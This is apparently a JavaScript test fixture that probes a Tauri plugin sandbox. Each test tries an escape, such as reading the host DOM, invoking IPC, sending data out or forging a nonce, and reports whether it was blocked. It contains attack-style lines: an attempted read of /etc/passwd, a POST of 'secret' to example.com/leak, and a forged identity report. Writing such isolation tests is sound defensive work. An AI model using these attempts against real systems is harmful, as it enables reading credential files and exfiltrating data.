// 隔离探针的攻击脚本。
//
// 每条用例都**只观察、不隐藏**：它尝试一个越界动作，把“是否真的被挡住”如实上报。
// 原生侧独立复核 frame / nonce，并自行裁定恢复类用例；页面声称“已经恢复”不算证据。
//
// 注意：本文件是探针 fixture，绝不进入正式包。

const probe = window.__YI_PLUGIN_PROBE__;
const logElement = document.getElementById("probe-log");
const statusElement = document.getElementById("probe-status");

function log(line) {
  logElement.textContent += `${line}\n`;
}

const results = new Map();

function record(id, passed, evidence) {
  results.set(id, { passed, evidence });
  log(`${passed ? "ok  " : "FAIL"} ${id}: ${evidence.join("; ")}`);
}

function body(id, passed, evidence) {
  return JSON.stringify({
    frame: probe.frame,
    nonce: probe.nonce,
    case: id,
    passed,
    evidence,
  });
}

async function report(id, passed, evidence) {
  record(id, passed, evidence);
  try {
    const response = await fetch("__probe/report", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: body(id, passed, evidence),
    });
    if (!response.ok) {
      log(`native side rejected ${id}: ${response.status} ${await response.text()}`);
    }
  } catch (error) {
    log(`report of ${id} failed: ${String(error)}`);
  }
}

async function hostState() {
  try {
    const response = await fetch("__probe/state");
    if (!response.ok) return null;
    return await response.json();
  } catch {
    return null;
  }
}

// §4.1 —— 页面不能读宿主 DOM / 存储。
function domReadDenied() {
  let reached = false;
  try {
    reached = window.parent !== window && window.parent.document !== undefined;
  } catch {
    reached = false;
  }
  if (reached) {
    try {
      // 真能读到父文档才算失败。
      void window.parent.document.body;
      return [false, ["the plugin frame read the host document"]];
    } catch {
      return [true, ["cross-origin access to the host document threw"]];
    }
  }
  return [true, ["the frame has no host parent (separate webview)"]];
}

async function nativeStorageDenied() {
  const evidence = [];

  // 先如实记录**看得见**什么。Tauri 会给每个 webview 注入 `__TAURI_INTERNALS__`，
  // 所以“全局对象存在”本身不是泄漏；能不能真的读到宿主数据才是。
  // 这条区分必须留在证据里，否则审阅者会把“对象存在”误读成“已经越权”。
  const visible = ["__TAURI__", "__TAURI_INTERNALS__", "__TAURI_IPC__", "ipc"].filter(
    (name) => name in window && window[name] !== undefined && window[name] !== null,
  );
  evidence.push(
    visible.length > 0
      ? `host bridge objects are injected into the page: ${visible.join(", ")}`
      : "no host bridge object is injected",
  );

  // 插件的 DOM 存储由浏览器提供，允许存在。§4.1 禁止的是读**宿主**存储。
  try {
    window.localStorage.setItem("__probe", "1");
    const roundTrip = window.localStorage.getItem("__probe") === "1";
    window.localStorage.removeItem("__probe");
    evidence.push(
      roundTrip
        ? "browser-local storage works and is scoped to this frame (allowed)"
        : "browser-local storage did not round-trip",
    );
  } catch (error) {
    evidence.push(`browser-local storage threw: ${String(error).slice(0, 60)}`);
  }

  // 真正的判据：通过宿主桥发起的读请求必须全部失败。成功一条即为越权。
  const invoke = window.__TAURI_INTERNALS__ && window.__TAURI_INTERNALS__.invoke;
  if (typeof invoke !== "function") {
    evidence.push("no invoke surface is reachable, so no host storage read is possible");
    return [true, evidence];
  }

  const attempts = [
    ["host rpc (sidecar)", "rpc", { method: "runtime.status", params: {} }],
    ["plugin store", "plugin:store|get", { key: "session", id: 1 }],
    ["filesystem read", "plugin:fs|read_text_file", { path: "/etc/passwd" }],
    ["dialog open", "plugin:dialog|open", { options: {} }],
  ];
  for (const [label, command, args] of attempts) {
    try {
      await invoke(command, args);
      evidence.push(`BREACH: ${label} (\`${command}\`) resolved for the plugin page`);
      return [false, evidence];
    } catch (error) {
      const message = String(error).replace(/\s+/g, " ").slice(0, 140);
      evidence.push(`${label} refused: ${message}`);
    }
  }
  evidence.push("every host-storage read was refused");
  return [true, evidence];
}

// §4.2 —— 页面不能调用 Tauri invoke / 打开器 / 文件对话框。
async function nativeInvokeDenied() {
  const attempts = [];
  if (window.__TAURI_INTERNALS__ && typeof window.__TAURI_INTERNALS__.invoke === "function") {
    try {
      await window.__TAURI_INTERNALS__.invoke("plugin:opener|open_url", { url: "https://example.com" });
      attempts.push("invoke(opener) resolved");
    } catch (error) {
      attempts.push(`invoke threw: ${String(error).slice(0, 80)}`);
    }
  }
  const probeScript = document.createElement("script");
  probeScript.textContent = "window.__invokeProbe = typeof window.__TAURI_INTERNALS__;";
  document.head.appendChild(probeScript);
  if (window.__invokeProbe && window.__invokeProbe !== "undefined") {
    attempts.push("invoke is reachable from inline script");
  }
  return attempts.some((line) => line === "invoke(opener) resolved")
    ? [false, attempts]
    : [true, attempts.length ? attempts : ["no invoke surface exists"]];
}

// §4.3 —— 资源只来自当前包白名单。
async function crossPackageAssetDenied() {
  try {
    const response = await fetch("foreign/secret.txt");
    const text = await response.text();
    return response.ok
      ? [false, [`cross-package read succeeded with ${text.length} bytes`]]
      : [true, [`cross-package read refused: ${response.status}`]];
  } catch (error) {
    return [true, [`cross-package read threw: ${String(error).slice(0, 80)}`]];
  }
}

async function crossVersionAssetDenied() {
  try {
    const response = await fetch("../v0.0.1/index.html");
    return response.ok
      ? [false, ["a sibling version's assets were readable"]]
      : [true, [`cross-version read refused: ${response.status}`]];
  } catch (error) {
    return [true, [`cross-version read threw: ${String(error).slice(0, 80)}`]];
  }
}

// §4.4 —— 禁止自行联网、顶层跳转、弹窗、子 frame、表单外送与远程资源。
function navigationAndPopupDenied() {
  const evidence = [];
  let opened;
  try {
    opened = window.open("https://example.com", "_blank");
  } catch (error) {
    evidence.push(`window.open threw: ${String(error).slice(0, 60)}`);
  }
  if (opened) {
    evidence.push("window.open returned a handle");
    try {
      opened.close();
    } catch {
      /* ignore */
    }
    return [false, evidence];
  }
  evidence.push("window.open did not produce a window");

  const before = location.href;
  try {
    const anchor = document.createElement("a");
    anchor.href = "https://example.com";
    anchor.rel = "noopener";
    document.body.appendChild(anchor);
    anchor.click();
  } catch (error) {
    evidence.push(`top-level anchor threw: ${String(error).slice(0, 60)}`);
  }
  if (location.href !== before) {
    evidence.push(`location changed to ${location.href}`);
    return [false, evidence];
  }
  evidence.push("top-level navigation did not take effect");
  return [true, evidence];
}

async function implicitExfiltrationDenied() {
  const evidence = [];
  const attempts = [
    () => fetch("https://example.com/probe.png", { mode: "no-cors" }),
    () => fetch("https://example.com/leak", { method: "POST", body: "secret", mode: "no-cors" }),
  ];
  for (const attempt of attempts) {
    try {
      await attempt();
      evidence.push("a remote request resolved");
      return [false, evidence];
    } catch (error) {
      evidence.push(`remote request blocked: ${String(error).slice(0, 70)}`);
    }
  }

  const image = document.createElement("img");
  image.src = "https://example.com/pixel.png";
  document.body.appendChild(image);
  // CSP 下图片通道也必须被挡：用加载结果判断，而不是假设。
  await new Promise((resolve) => {
    image.onerror = () => resolve();
    image.onload = () => resolve();
    setTimeout(resolve, 1500);
  });
  if (image.naturalWidth > 0) {
    evidence.push("a remote image loaded");
    return [false, evidence];
  }
  evidence.push("remote image did not load");

  const form = document.createElement("form");
  form.action = "https://example.com/submit";
  form.method = "POST";
  document.body.appendChild(form);
  const submitBlocked = await new Promise((resolve) => {
    try {
      form.submit();
      setTimeout(() => resolve(location.href.startsWith("plugin-asset") || location.href.startsWith("http://plugin-asset")), 400);
    } catch {
      resolve(true);
    }
  });
  if (!submitBlocked) {
    evidence.push("a form submission left the page");
    return [false, evidence];
  }
  evidence.push("form-action was blocked");
  return [true, evidence];
}

// §4.6 —— frame 不能冒领别人身份，也不能重放初始化。
function frameImpersonationDenied() {
  const evidence = [];
  try {
    // 尝试把 nonce 改成一个明显伪造的值并上报：原生侧必须拒绝。
    const forged = JSON.stringify({
      frame: "frame-1",
      nonce: "forged-nonce",
      case: "frame_impersonation_denied",
      passed: true,
      evidence: ["forged"],
    });
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "__probe/report", false);
    xhr.setRequestHeader("content-type", "application/json");
    xhr.send(forged);
    if (xhr.status >= 200 && xhr.status < 300) {
      return [false, ["the native side accepted a forged nonce"]];
    }
    evidence.push(`forged nonce refused with ${xhr.status}`);
  } catch (error) {
    evidence.push(`forged nonce attempt threw: ${String(error).slice(0, 70)}`);
  }
  return [true, evidence];
}

function crossFrameReplayDenied() {
  // 子 frame 在 CSP `frame-src 'none'` 下不应产生；即便产生，本页面也会
  // 如实记录它存在，交给原生侧判断。
  const frames = Array.from(document.querySelectorAll("iframe"));
  if (frames.length > 0) {
    return [false, [`${frames.length} child frames were created`]];
  }
  return [true, ["no child frame exists, so no replay channel either"]];
}

// §4.7 —— 有界大量分配：只制造有限压力，绝不试图耗尽机器内存。
function allocBurstIsBounded() {
  const chunks = [];
  const chunkBytes = 1024 * 1024;
  try {
    for (let index = 0; index < 32; index += 1) {
      const chunk = new Uint8Array(chunkBytes);
      chunk.fill(index & 0xff);
      chunks.push(chunk);
    }
  } catch (error) {
    chunks.length = 0;
    return [true, [`bounded allocation stopped early: ${String(error).slice(0, 60)}`]];
  }
  const held = chunks.length;
  chunks.length = 0;
  return [true, [`allocated a bounded ${held} MiB burst, then released it`]];
}

// §4.6 —— 正常路径：中文输入、键盘/焦点、滚动、主题令牌与尺寸。
async function normalInteractionWorks() {
  const evidence = [];
  const input = document.getElementById("probe-input");
  input.focus();
  if (document.activeElement !== input) {
    return [false, ["the probe input could not take focus"]];
  }
  evidence.push("focus works");

  input.value = "中文输入";
  input.dispatchEvent(new Event("input", { bubbles: true }));
  if (input.value !== "中文输入") {
    return [false, ["CJK text did not survive the input event"]];
  }
  evidence.push("IME text path works");

  const root = getComputedStyle(document.documentElement);
  if (!root.getPropertyValue("--bg").trim()) {
    evidence.push("no theme token is defined (warning, not a failure)");
  } else {
    evidence.push("theme tokens resolve");
  }

  const tall = document.createElement("div");
  tall.style.height = "2000px";
  document.body.appendChild(tall);
  window.scrollTo(0, 400);
  const scrolled = window.scrollY > 0;
  tall.remove();
  window.scrollTo(0, 0);
  if (!scrolled) {
    return [false, ["the page did not scroll"]];
  }
  evidence.push("scrolling works");

  if (window.innerWidth < 200 || window.innerHeight < 200) {
    return [false, [`panel is too small: ${window.innerWidth}x${window.innerHeight}`]];
  }
  evidence.push(`panel sized ${window.innerWidth}x${window.innerHeight}`);
  return [true, evidence];
}

// 恢复用例：先让原生侧知道“我要阻塞了”，再真正阻塞主线程。
// 阻塞必须短到不会拖死整份报告，且原生侧会在这段时间内关闭并重建容器。
function enterBlockingPhase() {
  const blocking = JSON.stringify({
    frame: probe.frame,
    nonce: probe.nonce,
    case: "blocked_script_recovery",
    passed: false,
    evidence: ["blocking"],
  });
  try {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "__probe/report", false);
    xhr.setRequestHeader("content-type", "application/json");
    xhr.send(blocking);
  } catch {
    /* 原生侧会按超时处理 */
  }
  statusElement.textContent = "blocked (native side is expected to rebuild)";
  const until = Date.now() + 60_000;
  while (Date.now() < until) {
    // 刻意自旋：用来证明 iframe / 主页面 JS 看门狗都靠不住，恢复必须由原生侧完成。
  }
}

function announceWindow() {
  statusElement.textContent = `probe window ${probe.frame}`;
  log(`frame=${probe.frame} origin=${location.origin}`);
}

async function runFirstPass() {
  announceWindow();
  await report("dom_read_denied", ...domReadDenied());
  await report("native_storage_read_denied", ...(await nativeStorageDenied()));
  await report("native_invoke_denied", ...(await nativeInvokeDenied()));
  await report("cross_package_asset_denied", ...(await crossPackageAssetDenied()));
  await report("cross_version_asset_denied", ...(await crossVersionAssetDenied()));
  await report("navigation_and_popup_denied", ...navigationAndPopupDenied());
  await report("implicit_exfiltration_denied", ...(await implicitExfiltrationDenied()));
  await report("frame_impersonation_denied", ...frameImpersonationDenied());
  await report("cross_frame_replay_denied", ...crossFrameReplayDenied());
  await report("alloc_burst_is_bounded", ...allocBurstIsBounded());
  enterBlockingPhase();
}

async function runRecoveryPass() {
  announceWindow();
  const state = await hostState();
  if (!state) {
    await report("normal_interaction_works", false, ["host state is unreachable"]);
    return;
  }
  if (state.generation < 2) {
    await report("normal_interaction_works", false, [`unexpected generation ${state.generation}`]);
    return;
  }
  // 宿主标记由原生侧写入实例根，页面能读到它说明重建后的容器仍指向同一个
  // 持久化会话；读不到就不是“恢复”，如实报失败。
  if (state.marker !== 1) {
    await report("normal_interaction_works", false, [
      `the host marker did not survive the rebuild (marker=${JSON.stringify(state.marker)})`,
    ]);
    return;
  }
  // 恢复结论本身由原生侧裁定；这里只报“交互恢复正常”。
  await report("normal_interaction_works", ...(await normalInteractionWorks()));
}

// 面板上的两个按钮也走真实路径：滚动与焦点不是靠脚本直接调 API 假装成功的。
const scrollButton = document.getElementById("probe-scroll");
if (scrollButton) {
  scrollButton.addEventListener("click", () => window.scrollBy(0, 200));
}
const focusButton = document.getElementById("probe-focus");
if (focusButton) {
  focusButton.addEventListener("click", () => document.getElementById("probe-input").focus());
}

const generation = new URLSearchParams(location.search).get("gen") || "1";
if (generation === "1") {
  runFirstPass().catch((error) => log(`first pass crashed: ${String(error)}`));
} else {
  runRecoveryPass().catch((error) => log(`recovery pass crashed: ${String(error)}`));
}
